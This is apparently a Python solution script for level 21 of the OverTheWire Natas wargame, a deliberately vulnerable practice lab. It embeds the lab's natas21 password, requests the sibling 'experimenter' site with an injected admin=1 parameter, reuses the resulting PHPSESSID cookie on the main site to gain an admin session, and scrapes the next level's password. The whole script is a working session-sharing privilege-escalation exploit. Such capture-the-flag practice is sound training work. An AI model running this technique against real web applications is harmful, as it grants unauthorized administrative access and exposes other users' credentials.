#!/usr/bin/env python3

import requests
import re


req = requests.Session()


username = "natas21"
password = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"
url = "http://%s.natas.labs.overthewire.org/" % username
exp_url = "http://natas21-experimenter.natas.labs.overthewire.org/index.php"


req_post = req.get(exp_url+"?submit=1&admin=1",auth=(username,password))
req.cookies.set('PHPSESSID',req_post.cookies['PHPSESSID'])

req_get = req.get(url,auth=(username,password))

new_password = re.findall("Password: (.*)</pre>",req_get.text)
print(new_password[0])
